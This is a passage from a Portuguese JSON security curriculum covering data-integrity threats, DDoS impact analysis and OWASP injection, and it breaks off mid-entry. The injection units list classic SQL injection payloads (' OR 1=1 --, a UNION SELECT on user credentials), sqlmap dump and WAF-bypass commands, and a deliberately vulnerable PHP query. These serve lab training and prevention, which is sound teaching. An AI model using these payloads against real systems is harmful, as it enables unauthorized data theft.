                            "description": "Descrever alterações não autorizadas de dados ou lógica de negócio, como manipulação de transações financeiras ou injeção de conteúdo falso.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender o conceito de integridade em segurança de aplicações web",
                                  "subSteps": [
                                    "Defina integridade como a garantia de que os dados e a lógica de negócio não sejam alterados de forma não autorizada.",
                                    "Explique a tríade CIA (Confidencialidade, Integridade, Disponibilidade) e o papel da integridade nela.",
                                    "Discuta por que a integridade é crítica em aplicações web que lidam com dados sensíveis.",
                                    "Identifique ameaças básicas à integridade, como modificações maliciosas.",
                                    "Revise exemplos iniciais de violações, como edição de campos em formulários."
                                  ],
                                  "verification": "Resuma em 3 frases o que é integridade e sua importância, sem erros conceituais.",
                                  "estimatedTime": "20 minutos",
                                  "materials": [
                                    "Documento sobre tríade CIA",
                                    "Vídeo introdutório de 5 minutos sobre segurança web"
                                  ],
                                  "tips": "Use analogias cotidianas, como um cheque falsificado, para fixar o conceito.",
                                  "learningObjective": "Entender o conceito fundamental de integridade e sua relevância no contexto de segurança web.",
                                  "commonMistakes": [
                                    "Confundir integridade com confidencialidade",
                                    "Ignorar o impacto na lógica de negócio"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar tipos de alterações não autorizadas de dados",
                                  "subSteps": [
                                    "Classifique alterações em dados estáticos (ex: editar registros em banco) e dinâmicos (ex: parâmetros de URL).",
                                    "Descreva manipulação via interfaces de usuário, como ferramentas de desenvolvedor do navegador.",
                                    "Explore ataques como tampering de cookies ou sessões para alterar estados.",
                                    "Liste ferramentas comuns usadas por atacantes, como Burp Suite ou Postman.",
                                    "Pratique identificando vulnerabilidades em um formulário web simples."
                                  ],
                                  "verification": "Liste e descreva 4 tipos de alterações não autorizadas com exemplos breves.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Acesso a um ambiente de teste web vulnerável (ex: DVWA)",
                                    "Browser com dev tools"
                                  ],
                                  "tips": "Sempre inspecione o tráfego de rede para detectar manipulações potenciais.",
                                  "learningObjective": "Reconhecer e categorizar diferentes formas de alterações não autorizadas em dados web.",
                                  "commonMistakes": [
                                    "Focar apenas em SQL injection, ignorando client-side tampering",
                                    "Subestimar riscos de parâmetros ocultos"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Analisar manipulação de lógica de negócio e injeção de conteúdo falso",
                                  "subSteps": [
                                    "Explique manipulação de transações financeiras, como alterar valores em carrinhos de compra.",
                                    "Descreva injeção de conteúdo falso via SQL, XSS ou manipulação de lógica (ex: race conditions).",
                                    "Simule um cenário: altere um parâmetro de preço em uma requisição HTTP.",
                                    "Discuta como lógica de negócio fraca permite bypass de validações.",
                                    "Registre os passos de um ataque hipotético em um diagrama."
                                  ],
                                  "verification": "Crie um fluxograma de um ataque de manipulação de transação financeira.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Ferramenta proxy como Burp Suite Community",
                                    "Site de teste como OWASP Juice Shop"
                                  ],
                                  "tips": "Pense como um atacante: 'O que acontece se eu mudo este valor?'",
                                  "learningObjective": "Descrever mecanismos específicos de manipulação de lógica e injeção em aplicações web.",
                                  "commonMistakes": [
                                    "Confundir injeção com autenticação falha",
                                    "Não considerar validações server-side"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Descrever impactos potenciais e documentar riscos",
                                  "subSteps": [
                                    "Liste impactos: perdas financeiras, corrupção de dados, perda de confiança.",
                                    "Quantifique exemplos: 'Manipulação de $100 para $1 em 1000 transações causa prejuízo de $99k'.",
                                    "Crie um relatório descrevendo um impacto completo de uma ameaça.",
                                    "Compare com casos reais, como breaches conhecidos.",
                                    "Proponha métricas para medir severidade (ex: CVSS para integridade)."
                                  ],
                                  "verification": "Escreva um parágrafo descrevendo o impacto de uma manipulação financeira em um e-commerce.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Modelos de relatório STRIDE",
                                    "Casos de estudo de breaches (ex: Equifax)"
                                  ],
                                  "tips": "Use linguagem clara e quantitativa para tornar descrições impactantes.",
                                  "learningObjective": "Articular os impactos na integridade de forma estruturada e convincente.",
                                  "commonMistakes": [
                                    "Descrições vagas sem exemplos concretos",
                                    "Ignorar impactos indiretos como reputacionais"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um e-commerce, um atacante usa as dev tools do navegador para alterar o preço de um item de R$100 para R$1 no carrinho, completando a compra. Isso resulta em perda financeira direta e possível revenda de produtos abaixo do custo.",
                              "finalVerifications": [
                                "Pode definir integridade e listar 3 violações comuns.",
                                "Descreve com precisão manipulação de transações financeiras.",
                                "Explica injeção de conteúdo falso com exemplo prático.",
                                "Quantifica impactos em um cenário realista.",
                                "Cria um relatório curto sobre um impacto na integridade."
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual (sem confusões com outros pilares de segurança).",
                                "Detalhe nos exemplos (concretos e acionáveis).",
                                "Completude da descrição de impactos (financeiros, operacionais, reputacionais).",
                                "Uso de terminologia técnica adequada.",
                                "Capacidade de quantificar riscos.",
                                "Clareza e estrutura na comunicação."
                              ],
                              "crossCurricularConnections": [
                                "Ética e Direito: Implicações legais de violações de integridade (ex: fraudes cibernéticas).",
                                "Desenvolvimento de Software: Validações server-side em programação web.",
                                "Matemática: Modelagem de riscos quantitativos (probabilidade x impacto).",
                                "Negócios: Análise de impactos financeiros em modelos de negócio.",
                                "Psicologia: Engenharia social em manipulações de lógica."
                              ],
                              "realWorldApplication": "Em bancos online, detectar e descrever manipulações em transferências evita fraudes multimilionárias, como no caso do Carbanak malware que manipulou lógica de transações para roubar US$1 bilhão."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "beginner",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.2.3.3",
                            "name": "Impactos na disponibilidade e secundários",
                            "description": "Analisar DDoS, downtime e impactos indiretos como perda de reputação, custos legais e interrupção de serviços na nuvem ou mobile.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender conceitos básicos de disponibilidade e ataques DDoS",
                                  "subSteps": [
                                    "Defina disponibilidade em sistemas web como a capacidade de estar operacional e acessível 99,9% do tempo ou mais.",
                                    "Explique o que é um ataque DDoS: inundação de tráfego falso para sobrecarregar servidores.",
                                    "Diferencie DDoS de outros ataques como DoS simples.",
                                    "Identifique métricas chave: tempo de resposta, taxa de uptime e latência.",
                                    "Pesquise exemplos históricos de DDoS famosos."
                                  ],
                                  "verification": "Resuma em um parágrafo os conceitos e liste 3 exemplos de DDoS.",
                                  "estimatedTime": "45 minutos",
                                  "materials": "Artigos da Wikipedia sobre DDoS, vídeo do Cloudflare sobre ataques DDoS, calculadora de uptime online.",
                                  "tips": "Use analogias como 'trânsito engarrafado' para visualizar sobrecarga.",
                                  "learningObjective": "Dominar definições fundamentais de disponibilidade e DDoS para basear análises.",
                                  "commonMistakes": "Confundir DDoS com hacking de dados; ignorar que DDoS é sobre volume, não invasão."
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Analisar impactos diretos na disponibilidade (downtime)",
                                  "subSteps": [
                                    "Calcule o custo de downtime: fórmula básica (receita/hora x horas de inatividade).",
                                    "Simule cenários: site fora por 1 hora durante pico de tráfego.",
                                    "Meça efeitos: perda de vendas, usuários frustrados abandonando carrinho.",
                                    "Discuta SLAs (Service Level Agreements) e penalidades por downtime.",
                                    "Registre métricas: tempo médio de recuperação (MTTR)."
                                  ],
                                  "verification": "Crie uma tabela com 3 cenários de downtime e seus custos estimados.",
                                  "estimatedTime": "60 minutos",
                                  "materials": "Planilha Excel ou Google Sheets, dados de receita fictícia, ferramenta de calculadora de downtime (ex: AWS Calculator).",
                                  "tips": "Comece com números reais de uma empresa conhecida para tornar concreto.",
                                  "learningObjective": "Quantificar perdas financeiras diretas causadas por interrupções de serviço.",
                                  "commonMistakes": "Subestimar picos sazonais como Black Friday; ignorar custos indiretos no passo direto."
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Explorar impactos secundários e indiretos",
                                  "subSteps": [
                                    "Liste impactos como perda de reputação: queda em rankings SEO e confiança de clientes.",
                                    "Analise custos legais: violações de LGPD ou multas por não cumprir SLAs.",
                                    "Avalie efeitos em cadeia: interrupção de APIs integradas afetando parceiros.",
                                    "Considere perda de dados em recuperação ou blacklists de IP.",
                                    "Mapeie em um diagrama de causa-efeito."
                                  ],
                                  "verification": "Desenvolva um mindmap com pelo menos 5 impactos secundários ramificados.",
                                  "estimatedTime": "50 minutos",
                                  "materials": "Ferramenta de mindmap (MindMeister ou papel/caneta), artigos sobre casos reais de DDoS.",
                                  "tips": "Pense em 'efeito dominó': um downtime leva a reviews negativos no Google.",
                                  "learningObjective": "Identificar e priorizar impactos não óbvios para uma visão holística.",
                                  "commonMistakes": "Focar só em finanças imediatas; negligenciar reputação de longo prazo."
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Aplicar análise em contextos de nuvem e mobile",
                                  "subSteps": [
                                    "Analise DDoS em nuvem: auto-scaling falhando, custos de tráfego explosivo na AWS/Azure.",
                                    "Estude mobile: apps nativos caindo por backend indisponível, notificações push falhando.",
                                    "Compare mitigações: CDN como Cloudflare vs. firewalls locais.",
                                    "Simule um caso híbrido: app mobile + nuvem atacado.",
                                    "Proponha métricas de resiliência específicas para esses ambientes."
                                  ],
                                  "verification": "Escreva um relatório curto (200 palavras) sobre um cenário nuvem/mobile.",
                                  "estimatedTime": "55 minutos",
                                  "materials": "Documentação AWS Shield ou Azure DDoS Protection, simulador online de tráfego (ex: Loader.io).",
                                  "tips": "Use contas free tier para testes reais sem custo.",
                                  "learningObjective": "Adaptar análise de impactos a arquiteturas modernas web/mobile.",
                                  "commonMistakes": "Ignorar escalabilidade da nuvem como mitigador parcial; tratar mobile como isolado."
                                }
                              ],
                              "practicalExample": "Simule um ataque DDoS em um e-commerce durante Black Friday: o site fica 2 horas offline, causando R$500k em vendas perdidas, reviews negativos caindo a nota de 4.8 para 3.2 estrelas, multa de R$100k por violação de SLA com provedor de nuvem, e blacklist temporária afetando app mobile.",
                              "finalVerifications": [
                                "Lista completa de 5 impactos diretos e 5 secundários de um DDoS.",
                                "Cálculo preciso de custo de downtime para um cenário dado.",
                                "Diagrama de impactos em cadeia para serviços nuvem/mobile.",
                                "Identificação de 3 mitigações preventivas baseadas na análise.",
                                "Explicação verbal de um caso real com lições aprendidas.",
                                "Autoavaliação: 'Posso analisar qualquer downtime futuro?'"
                              ],
                              "assessmentCriteria": [
                                "Precisão conceitual: definições corretas sem erros comuns (30%).",
                                "Profundidade quantitativa: cálculos e métricas realistas (25%).",
                                "Abrangência de impactos: cobertura de diretos/secundários e contextos (20%).",
                                "Criatividade em exemplos: cenários práticos e originais (15%).",
                                "Clareza na comunicação: diagramas e resumos legíveis (10%)."
                              ],
                              "crossCurricularConnections": [
                                "Gestão de Negócios: análise de ROI em segurança cibernética.",
                                "Direito Digital: conformidade com LGPD e responsabilidades legais por downtime.",
                                "Economia: modelagem de custos opportunity e perdas intangíveis.",
                                "Desenvolvimento de Software: design resiliente de APIs e apps mobile."
                              ],
                              "realWorldApplication": "Em uma empresa de delivery online, analisar impactos de DDoS durante promoções permite justificar investimentos em WAF (Web Application Firewall), evitando perdas de R$1M+ e construindo confiança com investidores ao demonstrar proatividade em segurança."
                            },
                            "estimatedTime": "0.75 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          }
                        ]
                      }
                    ]
                  },
                  {
                    "id": "10.1.5.3",
                    "name": "Vulnerabilidades Comuns OWASP Top 10",
                    "description": "Visão geral das dez principais vulnerabilidades em aplicações web, como injeção e XSS.",
                    "individualConcepts": [
                      {
                        "id": "10.1.5.3.1",
                        "name": "Vulnerabilidades de Injeção",
                        "description": "Visão geral da categoria de injeção no OWASP Top 10 (A03:2021), incluindo SQL Injection, NoSQL Injection e Command Injection, onde dados não confiáveis são enviados para um interpretador como parte de uma query ou comando.",
                        "specificSkills": [
                          {
                            "id": "10.1.5.3.1.1",
                            "name": "Identificar ataques de injeção em aplicações web",
                            "description": "Reconhecer padrões de código vulneráveis a injeções, como concatenação de strings em consultas SQL sem sanitização, e simular ataques básicos usando ferramentas como SQLMap.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os Conceitos Básicos de Ataques de Injeção",
                                  "subSteps": [
                                    "Estude a definição de injeção de código, focando em SQL Injection (SQLi), onde entradas não sanitizadas alteram consultas SQL.",
                                    "Aprenda tipos comuns: in-band (error-based, union-based), blind (boolean-based, time-based) e out-of-band.",
                                    "Revise exemplos clássicos de payloads como ' OR 1=1 -- para bypass de login.",
                                    "Entenda o impacto: vazamento de dados, autenticação bypass, execução de comandos.",
                                    "Assista a vídeos curtos sobre OWASP Top 10 Injection."
                                  ],
                                  "verification": "Explique em suas palavras o que é SQLi e liste 3 tipos com exemplos breves.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Documentação OWASP Injection Cheat Sheet",
                                    "Vídeos PortSwigger Web Security Academy",
                                    "Notebook para anotações"
                                  ],
                                  "tips": "Use analogias como 'veneno na água' para entradas maliciosas contaminarem a consulta.",
                                  "learningObjective": "Dominar fundamentos teóricos de injeções para reconhecimento posterior.",
                                  "commonMistakes": [
                                    "Confundir SQLi com XSS",
                                    "Ignorar variações blind",
                                    "Subestimar impactos em NoSQL"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Identificar Padrões Vulneráveis no Código Fonte",
                                  "subSteps": [
                                    "Analise código PHP/Java com concatenação de strings em queries SQL, ex: $query = \"SELECT * FROM users WHERE id = \" . $_GET['id'];",
                                    "Procure por ausência de prepared statements, PDO ou sanitização (mysqli_real_escape_string).",
                                    "Identifique hotspots: campos de login, search boxes, URL parameters.",
                                    "Use ferramentas como grep ou IDE search para padrões como '.*\\$\\w+.*' em queries.",
                                    "Compare código vulnerável vs. seguro (com bind parameters)."
                                  ],
                                  "verification": "Dado um snippet de código, destaque linhas vulneráveis e explique por quê.",
                                  "estimatedTime": "60 minutos",
                                  "materials": [
                                    "Exemplos de código vulnerável do GitHub (DVWA)",
                                    "Editor de código como VS Code",
                                    "OWASP Code Review Guide"
                                  ],
                                  "tips": "Sempre pergunte: 'Onde a entrada do usuário entra na query e é tratada?'",
                                  "learningObjective": "Reconhecer código suscetível a injeções em linguagens web comuns.",
                                  "commonMistakes": [
                                    "Focar só em SQL, ignorar NoSQL/Command Injection",
                                    "Confundir escaping com validação",
                                    "Não notar dynamic queries"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Simular Ataques Manuais em Ambiente Controlado",
                                  "subSteps": [
                                    "Configure DVWA ou bWAPP em localhost com XAMPP.",
                                    "Teste campos vulneráveis com payloads simples: ' OR '1'='1', admin' --.",
                                    "Observe respostas: dumps de DB, erros reveladores.",
                                    "Experimente variações para blind SQLi usando SLEEP() ou BENCHMARK().",
                                    "Registre screenshots de sucessos e falhas."
                                  ],
                                  "verification": "Demonstre bypass de login em DVWA e capture evidência.",
                                  "estimatedTime": "90 minutos",
                                  "materials": [
                                    "DVWA ou Mutillidae (Docker/VirtualBox)",
                                    "Browser com Burp Suite Community",
                                    "Penetration Testing Bible PDF"
                                  ],
                                  "tips": "Comece com low security level no DVWA para sucesso rápido, depois aumente.",
                                  "learningObjective": "Executar e observar efeitos de injeções manualmente.",
                                  "commonMistakes": [
                                    "Testar em sites reais (ilegal)",
                                    "Ignorar WAF simulado",
                                    "Não limpar setup após testes"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Utilizar Ferramentas Automatizadas como SQLMap",
                                  "subSteps": [
                                    "Instale SQLMap via pip ou git clone.",
                                    "Execute scans básicos: sqlmap -u \"http://target/vuln.php?id=1\" --batch.",
                                    "Use opções como --dbs, --tables, --dump para exploração.",
                                    "Teste tamper scripts para bypass WAF: sqlmap -u URL --tamper=space2comment.",
                                    "Analise output e valide com manual testing."
                                  ],
                                  "verification": "Gere relatório de SQLMap dumpando uma tabela de DVWA.",
                                  "estimatedTime": "75 minutos",
                                  "materials": [
                                    "SQLMap oficial (github.com/sqlmapproject)",
                                    "DVWA rodando",
                                    "Terminal Kali Linux ou VM"
                                  ],
                                  "tips": "Sempre use --risk=3 --level=5 só em labs; leia --help para opções.",
                                  "learningObjective": "Automatizar detecção e exploração de SQLi com ferramentas profissionais.",
                                  "commonMistakes": [
                                    "Executar sem proxy/tor em labs",
                                    "Interpretar falsos positivos",
                                    "Não entender flags usadas"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um app de e-commerce vulnerável, um campo de busca \"SELECT * FROM products WHERE name LIKE '%\" . $_GET['q'] . \"%'\" permite payload \"' UNION SELECT username,password FROM users-- \" resultando em dump de credenciais de admin.",
                              "finalVerifications": [
                                "Lista 5 payloads clássicos de SQLi e seus efeitos.",
                                "Identifica vulnerabilidades em 3 snippets de código fornecidos.",
                                "Executa SQLMap para dump de DB em DVWA.",
                                "Explica diferenças entre in-band e blind SQLi com exemplos.",
                                "Propõe 3 fixes para código vulnerável (prepared statements).",
                                "Registra vídeo demo de bypass manual."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de padrões vulneráveis (90%+ acerto).",
                                "Profundidade nos substeps executados e documentados.",
                                "Correta interpretação de outputs de ferramentas.",
                                "Criatividade em payloads e simulações.",
                                "Conexão clara com conceitos OWASP.",
                                "Tempo respeitado e setup limpo."
                              ],
                              "crossCurricularConnections": [
                                "Programação: Uso de prepared statements em linguagens como PHP/Python.",
                                "Redes: Entendimento de HTTP requests/responses via Burp.",
                                "Ética: Discussão legal de pentesting (autorização requerida).",
                                "Banco de Dados: Queries SQL avançadas e estruturas.",
                                "Matemática: Lógica booleana em blind SQLi."
                              ],
                              "realWorldApplication": "Detectar SQLi em apps bancários/e-commerces previne breaches como o Equifax (2017, 147M registros vazados) ou Heartland Payment (130M cartões), permitindo auditorias de segurança e conformidade PCI-DSS."
                            },
                            "estimatedTime": "1 hora",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.3.1.2",
                            "name": "Analisar impactos de vulnerabilidades de injeção",
                            "description": "Avaliar riscos como divulgação de dados, perda de integridade ou ganho de controle do servidor, com exemplos reais de breaches reportados em relatórios OWASP.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender os fundamentos das vulnerabilidades de injeção",
                                  "subSteps": [
                                    "Ler a definição oficial de vulnerabilidades de injeção no OWASP Top 10.",
                                    "Identificar tipos comuns: SQL Injection (SQLi), NoSQL Injection, Command Injection e LDAP Injection.",
                                    "Analisar como entradas não sanitizadas permitem execução de código malicioso.",
                                    "Diferenciar injeção de outros ataques como XSS ou CSRF.",
                                    "Mapear vetores de ataque comuns em aplicações web (formulários, URLs, APIs)."
                                  ],
                                  "verification": "Escrever um resumo de 100 palavras explicando o que é injeção e liste 3 tipos com exemplos breves.",
                                  "estimatedTime": "25 minutos",
                                  "materials": [
                                    "Página OWASP Top 10 - Injection",
                                    "Documentação oficial OWASP sobre SQLi"
                                  ],
                                  "tips": "Sempre pense em 'trusted input' vs 'untrusted input'; foque em como o código do app processa dados do usuário.",
                                  "learningObjective": "Dominar a definição e tipos de vulnerabilidades de injeção para basear análises de impacto.",
                                  "commonMistakes": [
                                    "Confundir injeção com autenticação fraca",
                                    "Ignorar injeções não-SQL como Command Injection",
                                    "Subestimar impactos em apps NoSQL"
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Mapear impactos potenciais na tríade CIA e além",
                                  "subSteps": [
                                    "Analisar impacto na Confidencialidade: divulgação de dados sensíveis (ex: dump de banco de dados).",
                                    "Avaliar Integridade: alteração de registros (ex: modificar saldos bancários).",
                                    "Examinar Disponibilidade: negação de serviço via comandos destrutivos.",
                                    "Identificar elevação de privilégios: ganho de controle do servidor ou RCE (Remote Code Execution).",
                                    "Considerar impactos secundários: perda financeira, violações regulatórias (GDPR, LGPD)."
                                  ],
                                  "verification": "Criar uma tabela ligando 3 tipos de injeção a impactos específicos na CIA triad.",
                                  "estimatedTime": "30 minutos",
                                  "materials": [
                                    "Guia OWASP sobre Tríade CIA",
                                    "Folha de cálculo ou ferramenta como Google Sheets"
                                  ],
                                  "tips": "Use a tríade CIA como framework inicial, mas expanda para autenticação e não-repúdio.",
                                  "learningObjective": "Classificar impactos de injeções em categorias de risco para priorização.",
                                  "commonMistakes": [
                                    "Focar só em SQLi e ignorar outros tipos",
                                    "Não quantificar severidade (ex: CVSS scores)",
                                    "Esquecer impactos chain (cadeia de ataques)"
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Estudar exemplos reais de breaches reportados OWASP",
                                  "subSteps": [
                                    "Pesquisar breaches famosos: Equifax (2017, SQLi levando a 147M registros expostos), Yahoo (SQLi em buscas).",
                                    "Ler relatórios OWASP: analisar estatísticas de prevalência e impactos econômicos.",
                                    "Mapear lições aprendidas: tempo médio para detecção, custos de remediação.",
                                    "Comparar com OWASP Top 10 histórico (A1:2017 Injection).",
                                    "Documentar métricas: número de vítimas, dados vazados, multas aplicadas."
                                  ],
                                  "verification": "Listar 2 breaches reais com descrição do impacto e fonte OWASP.",
                                  "estimatedTime": "40 minutos",
                                  "materials": [
                                    "Relatórios OWASP Top 10 (2017/2021)",
                                    "Sites como HaveIBeenPwned, notícias de breaches"
                                  ],
                                  "tips": "Busque fontes primárias como relatórios oficiais para credibilidade.",
                                  "learningObjective": "Contextualizar riscos teóricos com evidências reais de mundo.",
                                  "commonMistakes": [
                                    "Usar exemplos fictícios em vez de reais",
                                    "Não ligar ao OWASP Top 10",
                                    "Ignorar evoluções recentes como injeções em GraphQL"
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Realizar análise de impacto em um cenário simulado",
                                  "subSteps": [
                                    "Escolher um app vulnerável simulado (ex: DVWA ou bWAPP com SQLi).",
                                    "Explorar a vulnerabilidade e documentar impactos observados (ex: dump de users).",
                                    "Avaliar severidade usando CVSS v3.1 (base score para injeção).",
                                    "Propor cadeia de ataques: de injeção para persistência no servidor.",
                                    "Redigir relatório de análise com recomendações qualitativas."
                                  ],
                                  "verification": "Produzir um relatório de 1 página analisando impactos em um cenário específico.",
                                  "estimatedTime": "45 minutos",
                                  "materials": [
                                    "Ferramenta DVWA (Damn Vulnerable Web App)",
                                    "Calculadora CVSS online",
                                    "Editor de texto"
                                  ],
                                  "tips": "Teste em ambiente isolado (Docker/VM) para segurança; capture screenshots.",
                                  "learningObjective": "Aplicar conhecimentos para analisar impactos de forma independente.",
                                  "commonMistakes": [
                                    "Não isolar ambiente de teste",
                                    "Subestimar propagação de impactos",
                                    "Pular cálculo de severidade quantitativa"
                                  ]
                                }
                              ],
                              "practicalExample": "Em um sistema de e-commerce vulnerável a SQLi no login (' OR '1'='1), um atacante extrai todos os dados de cartões de crédito, resultando em divulgação de 500k registros, roubo financeiro de US$2M e multa GDPR de €20M, como no breach da Sony Pictures (2011, reportado OWASP).",
                              "finalVerifications": [
                                "Explicar 4 impactos principais de injeções com exemplos.",
                                "Citar 2 breaches reais OWASP e seus custos.",
                                "Classificar uma injeção em CIA triad com CVSS score.",
                                "Analisar um cenário simulado e propor mitigações.",
                                "Diferenciar SQLi de outros tipos de injeção.",
                                "Mapear cadeia de ataque de injeção para RCE."
                              ],
                              "assessmentCriteria": [
                                "Precisão na identificação de tipos e impactos de injeção (80% cobertura OWASP).",
                                "Uso de exemplos reais com fontes citadas.",
                                "Profundidade na análise CIA e CVSS (scores corretos).",
                                "Clareza no relatório prático com evidências.",
                                "Identificação de erros comuns e lições de breaches.",
                                "Conexão com contexto OWASP Top 10."
                              ],
                              "crossCurricularConnections": [
                                "Desenvolvimento de Software: Práticas de input validation e prepared statements.",
                                "Gestão de Riscos e Compliance: Avaliação de conformidade GDPR/LGPD.",
                                "Ética em TI: Responsabilidade em proteção de dados sensíveis.",
                                "Administração de Sistemas: Detecção e resposta a incidentes (IDS/IPS).",
                                "Direito Digital: Análise de responsabilidades legais em breaches."
                              ],
                              "realWorldApplication": "Em auditorias de penetração (pentests), analistas usam essa habilidade para priorizar vulnerabilidades em apps web, recomendando patches que previnem breaches multimilionárias, como visto em relatórios anuais OWASP e avaliações de segurança em empresas como bancos e e-commerces."
                            },
                            "estimatedTime": "0.5 horas",
                            "difficulty": "intermediate",
                            "status": "not_started",
                            "prerequisites": []
                          },
                          {
                            "id": "10.1.5.3.1.3",
                            "name": "Aplicar prevenções contra injeções",
                            "description": "Implementar prepared statements, stored procedures e validação de entrada em linguagens como PHP, Java e Node.js, conforme recomendado por Zalewski em 'The Tangled Web'.",
                            "atomicExpansion": {
                              "steps": [
                                {
                                  "stepNumber": 1,
                                  "title": "Compreender Vulnerabilidades de Injeção e Configurar Ambiente",
                                  "subSteps": [
                                    "Leia capítulos relevantes de 'The Tangled Web' de Michal Zalewski sobre injeções web.",
                                    "Instale um banco de dados local (MySQL/PostgreSQL) e crie uma tabela de teste para usuários.",
                                    "Configure ambientes de desenvolvimento para PHP, Java (com JDBC) e Node.js (com mysql2 ou pg).",
                                    "Crie um script vulnerável simples a SQL injection para demonstração.",
                                    "Estude exemplos de OWASP sobre injeções SQL, NoSQL e comando."
                                  ],
                                  "verification": "Ambiente rodando com script vulnerável que permite injeção comprovada via input malicioso.",
                                  "estimatedTime": "1-2 horas",
                                  "materials": [
                                    "Livro 'The Tangled Web' de Zalewski",
                                    "OWASP Injection Cheat Sheet",
                                    "Docker para MySQL/PostgreSQL",
                                    "IDEs: VS Code, IntelliJ, Eclipse"
                                  ],
                                  "tips": [
                                    "Use Docker para ambientes isolados e reproduzíveis.",
                                    "Sempre teste injeções clássicas como ' OR 1=1 -- primeiro."
                                  ],
                                  "learningObjective": "Entender mecanismos de injeção e preparar setups multiplataforma.",
                                  "commonMistakes": [
                                    "Ignorar injeções em contextos além de SQL (ex: LDAP, NoSQL).",
                                    "Não usar banco de teste descartável."
                                  ]
                                },
                                {
                                  "stepNumber": 2,
                                  "title": "Implementar Validação de Entrada",
                                  "subSteps": [
                                    "Defina regras de validação: comprimento, tipo (email, número), caracteres permitidos.",
                                    "Em PHP: Use filter_var() e preg_match() para sanitizar inputs.",
                                    "Em Java: Use Pattern.compile() e String.matches() com javax.validation.",
                                    "Em Node.js: Use Joi ou validator.js para schemas de validação.",
                                    "Integre validação no frontend (JS) e backend, rejeitando inputs inválidos com mensagens claras.",
                                    "Registre logs de tentativas inválidas."
                                  ],
                                  "verification": "Inputs maliciosos são rejeitados e logados; inputs válidos passam.",
                                  "estimatedTime": "2 horas",
                                  "materials": [
                                    "Bibliotecas: Joi (Node), Hibernate Validator (Java), PHP filters",
                                    "Documentação OWASP Input Validation"
                                  ],
                                  "tips": [
                                    "Valide no servidor sempre, cliente é só UX.",
                                    "Escape contexto-específico: HTML, JS, SQL separadamente."
                                  ],
                                  "learningObjective": "Aplicar validação whitelisting para bloquear payloads maliciosos.",
                                  "commonMistakes": [
                                    "Usar blacklist (fácil burlar).",
                                    "Validar só comprimento, ignorar contexto."
                                  ]
                                },
                                {
                                  "stepNumber": 3,
                                  "title": "Implementar Prepared Statements",
                                  "subSteps": [
                                    "Em PHP: Use PDO com bindParam() em vez de mysqli_query().",
                                    "Em Java: Use PreparedStatement com setString(), setInt() via JDBC.",
                                    "Em Node.js: Use placeholders ? com mysql2.promise() ou pg.",
                                    "Refatore o script vulnerável para usar params em queries de login/cadastro.",
                                    "Teste com payloads de injeção; confirme que não executam.",
                                    "Adicione transações para operações críticas."
                                  ],
                                  "verification": "Query não concatena user input; ferramentas como sqlmap falham em explorar.",
                                  "estimatedTime": "3 horas",
                                  "materials": [
                                    "Documentação PDO (PHP), JDBC (Java), mysql2/pg (Node)",
                                    "Ferramenta sqlmap para testes"
                                  ],
                                  "tips": [
                                    "Sempre bind tipos corretos para evitar type juggling.",
                                    "Prefira named parameters para clareza."
                                  ],
                                  "learningObjective": "Parametrizar queries para separar código de dados.",
                                  "commonMistakes": [
                                    "Concatenar params em prepared stmt (anula proteção).",
                                    "Esquecer bind em todas as variáveis."
                                  ]
                                },
                                {
                                  "stepNumber": 4,
                                  "title": "Implementar Stored Procedures e Integração Completa",
                                  "subSteps": [
                                    "Crie stored procedures no DB para login e insert user com parâmetros.",
                                    "Chame procs via PHP (PDO::query com CALL), Java (CallableStatement), Node (EXEC).",
                                    "Integre validação + prepared + procs em um fluxo completo (cadastro/login).",
                                    "Adicione rate limiting e CAPTCHA para brute force.",
                                    "Audite código com ferramentas estáticas (ESLint security, SonarQube)."
                                  ],
                                  "verification": "Sistema completo resiste a injeções variadas (SQLi, blind, time-based).",
                                  "estimatedTime": "2-3 horas",
                                  "materials": [
                                    "MySQL Workbench/pgAdmin para criar procs",
                                    "SonarQube ou PHPStan para linting"
                                  ],
                                  "tips": [
                                    "Procs reduzem superfície de ataque limitando privilégios.",
                                    "Teste procs isoladamente primeiro."
                                  ],
                                  "learningObjective": "Encapsular lógica DB em procs seguras.",
                                  "commonMistakes": [
                                    "Dar privilégios excessivos ao user do app.",
                                    "Não parametrizar inputs nas procs."
                                  ]
                                },
                                {
                                  "stepNumber": 5,
                                  "title": "Testar e Verificar Prevenções",
                                  "subSteps": [
                                    "Execute testes manuais com payloads OWASP (Tautology, Union, etc.).",
                                    "Use sqlmap, Burp Suite para scans automatizados.",
                                    "Implemente testes unitários com mocks de DB (PHPUnit, JUnit, Jest).",
                                    "Monitore logs por anomalias.",
                                    "Documente defesas em README e compare com baseline vulnerável.",
                                    "Realize code review simulada."
                                  ],
